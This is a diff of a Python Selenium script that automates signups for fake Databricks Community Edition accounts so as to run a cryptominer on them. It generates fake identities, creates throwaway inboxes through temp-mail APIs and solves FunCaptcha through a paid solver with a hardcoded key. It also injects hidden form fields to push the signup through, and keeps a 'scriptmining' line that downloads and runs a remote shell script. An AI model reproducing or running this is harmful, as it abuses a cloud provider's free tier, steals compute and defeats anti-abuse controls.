@@ -1,10 +1,7 @@
-import speech_recognition as sr
 from selenium import webdriver
 from selenium.webdriver import ActionChains
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
-import urllib.parse
-import urllib.request
 import requests
 import time
 import string
@@ -27,73 +24,84 @@ print('''
   ###########################################################################
   ''')
 multitab = 20 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 10-15tab
-scriptmining= "! wget https://raw.githubusercontent.com/Quocnd1704/Dataverus/main/server.sh && chmod u+x server.sh &&./server.sh"
-passwork   ="1234Abcdf@"
-timeopen=120
-timewaiting=120
-# Lay captcha va giai ma captcha
-def recognizeAudio(audiofilename):
-            recognize = sr.Recognizer()
-            with sr.AudioFile(audiofilename+'.wav' ) as s:
-                data = recognize.record(s)
-                raw = recognize.recognize_google(data)
-                answer = ''
-                for char in raw:
-                    if char.isdigit():
-                        answer += char
-                return answer
-def bypass_captcha(driver):
-   global captcha
-   driver.get("https://api.funcaptcha.com/fc/api/nojs/?pkey=A0DE7B75-1138-44F2-B132-ED188CEB66F3&gametype=audio&lang=en")
-   time.sleep(1)
-   driver.find_element_by_xpath('//*[@id="verifyButton"]').click()
-   time.sleep(1)
-   driver.find_element_by_name("audio_mode").click()
-   time.sleep(2)
-   href=driver.find_element_by_xpath('//*[@id="downloadButton"]').get_attribute('href')
-   getcaptchaAudio = requests.get(href)
-   audiornd = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 7))
-   open(f'{os.getcwd()}\{audiornd}'+'.wav', 'wb+').write(getcaptchaAudio.content)
-   n=0
-   while True:
-      captcha=recognizeAudio(f'{os.getcwd()}\{audiornd}')
-      n=n+1
-      if len(captcha)==7 or n>5:
-         break
-   driver.find_element_by_xpath('//*[@id="audioGuess"]').send_keys(captcha)
-   time.sleep(2)
-   driver.find_element_by_xpath('//*[@id="audioVerify"]').click()
+scriptmining= "! wget https://raw.githubusercontent.com/Quocnd1704/Dataverus/main/server.sh && chmod u+x server.sh &&./server.sh"passwork   ="1234Abcdf@"
+api="Jp6jbfaQ7WYdi54EcN0w"
+urlmail="https://temp-databricks.tk/api/"
+timeopen=30
+timewaiting=30
+def bypass_captcha():
+   r=requests.post("https://api.anycaptcha.com/createTask",headers = {'Content-Type': 'application/json'},data=json.dumps({"clientKey": "458d1c46ef944b1dba0c8d1ad10f3a0d","task": {"type": "FunCaptchaTaskProxyless","websitePublicKey": "A0DE7B75-1138-44F2-B132-ED188CEB66F3"}}))
+   datatext=r.json()
+   print(datatext)
+   tackid= datatext['taskId']
+   print("TackID :",tackid)
    time.sleep(5)
-   action=driver.find_element_by_xpath('/html/body/div/form/div/div/input').get_attribute('value')
-   return action
+   while True:
+        time.sleep(1)
+        req=requests.post("https://api.anycaptcha.com/getTaskResult", headers = {'Content-Type': 'application/json'},data=json.dumps({"clientKey": "458d1c46ef944b1dba0c8d1ad10f3a0d","taskId": tackid}))
+        print(req.json())
+        if (req.json())["status"]== "ready":
+            bypass=(req.json())["solution"]["token"]
+            return bypass
+            break
+        else :
+           continue
+def getmail(firstname,lastname):
+   r=requests.get(urlmail+"domains/"+api)
+   domains=(r.json())
+   n = random.choice(domains)
+   regemail=firstname+lastname+"@"+n
+   reg=requests.get(urlmail+"email/"+regemail+"/"+api) 
+   email=reg.text
+   return email   
+
+def checkmail(email): 
+   req=requests.get(urlmail+"messages/"+email+"/"+api)
+   data=req.json()
+   for key in data.keys():
+      mailbox=data[key]['content']
+      mintext=mailbox.find('href="')
+      maxtext=mailbox.find('">this link')
+      linkreset=mailbox[mintext+6:maxtext]
+      if linkreset !='':
+          return linkreset
+      else: return ("No Mailbox")
 # Tao acc Databricks
 def regdatabricks(driver,gmail,firstname,lastname,company,title):
   print("Mail :",gmail)
-  bypass2=bypass_captcha(driver)
-  print("Captcha: ",bypass2)
-  url = 'https://databricks.com/wp-content/themes/databricks/try-handler-v1.1.php'
-  user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
-  values ={ 'arkose_token_response': bypass2,'mkto_form_consent': 'yes','only_whitelisted_emails':'','workspace_type': 'CE','FirstName': firstname,'LastName': lastname,'Company': company,'Email': gmail,'Title': title,'Phone':'','useCase':'','role':'','mkto_form_consent_ce':'','UTM_Source__c':'','UTM_Campaign__c':'','UTM_Medium__c':'','UTM_Offer__c':'','UTM_Content__c':'','UTM_Keyword__c':'','returnURL':'','First_Touch_Source__c': 'Clicked CE','ITM__c':'','trialType': 'Clicked CE','action': 'try_platform_ce'}
-  headers = {'User-Agent': user_agent}
-  data = urllib.parse.urlencode(values)
-  data = data.encode('ascii')
-  req = urllib.request.Request(url, data, headers)
-  try: urllib.request.urlopen(req)
-  except urllib.error.URLError as e:
-     print(e.reason)
-def checkmail(email):
-    name=(email.split("@"))[0]
-    address=(email.split("@"))[1]
-    urlcheck="https://www.1secmail.com/api/v1/?action=getMessages&login="+name+"&domain="+address
-    rep=requests.get(urlcheck)
-    idmail=((rep.json())[0]["id"])
-    urlmailbox="https://www.1secmail.com/api/v1/?action=readMessage&login="+name+"&domain="+address+"&id="+str(idmail)
-    checkmail=requests.get(urlmailbox)
-    bodytext=((checkmail.json()))["body"]
-    linkreset=(bodytext[404:564])#===>địa chỉ resetpass
-    if linkreset != '':
-      return (linkreset)
-    else: return("Error")
+  driver.get('https://databricks.com/try-databricks')
+  time.sleep(3)
+  driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(firstname)
+  time.sleep(1)
+  driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(lastname)
+  time.sleep(1)
+  driver.find_element_by_xpath('//*[@id="Company"]').send_keys(company)
+  time.sleep(1)
+  driver.find_element_by_xpath('//*[@id="Email"]').send_keys(gmail)
+  time.sleep(1)
+  tits=driver.find_element_by_xpath('//*[@id="Title"]').send_keys(title)
+  time.sleep(2)
+  checkboxElement = driver.find_element_by_id("mkto_form_consent")
+  checkboxElement.send_keys(Keys.SPACE)
+  time.sleep(2)
+  driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()
+  bypass=bypass_captcha()
+  scritpjs=f"""
+       $('#submitToMktoForm_2021Feb10').prepend('<input type="hidden" name="arkose_token_response" value={bypass}>');
+	   $('#submitToMktoForm_2021Feb10').prepend('<input type="hidden" name="action" value="try_databricks">');
+       $('#submitToMktoForm_2021Feb10').unbind('submit').submit();
+
+"""  
+  driver.execute_script(scritpjs)
+  time.sleep(5)
+  checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')
+  checkboxElementw.send_keys(Keys.ENTER)  
+  by_pass=bypass_captcha()
+  scritpjave=f"""
+       commonFields();$('#signup-form-platform').prepend('<input type="hidden" name="arkose_token_response" value={by_pass}>');
+       $('#signup-form-platform').unbind('submit').submit();
+"""  
+  driver.execute_script(scritpjave)  
 def resetpass(linkreset,driver,waiting):
     driver.get(linkreset)
     time.sleep(5)
@@ -188,24 +196,21 @@ def autominer(waiting):
    option.add_argument('--disable-dev-shm-usage')
    drivers = webdriver.Chrome(executable_path="chromedriver",options=option)
    drivers.set_window_size(800, 1200)
-   drivers.minimize_window()
+   #drivers.minimize_window()
    firstname=faker.first_name()
    lastname=faker.last_name()
    title= faker.state()
-   company=faker.company()
-   url="https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
-   req = requests.get(url)
-   gmail=(req.json())[0] 
+   company=faker.company() 
    try:
-      global linkreset
-      regdatabricks(drivers,gmail,firstname,lastname,company,title)
-      time.sleep(20)
-      linkreset = checkmail(gmail)
-      print(linkreset)
-      resetpass(linkreset,drivers,waiting)
+      email=getmail(firstname,lastname)
+      regdatabricks(drivers,email,firstname,lastname,company,title)
+      time.sleep(70)
+      linkresetpas = checkmail(email)
+      print(linkresetpas)
+      resetpass(linkresetpas,drivers,waiting)
       autodatabricks(drivers,waiting)
-   except :
-     print("Error")
+   except Exception as e:
+     print(e)
      drivers.close()
      drivers.quit()
      time.sleep(timewaiting)
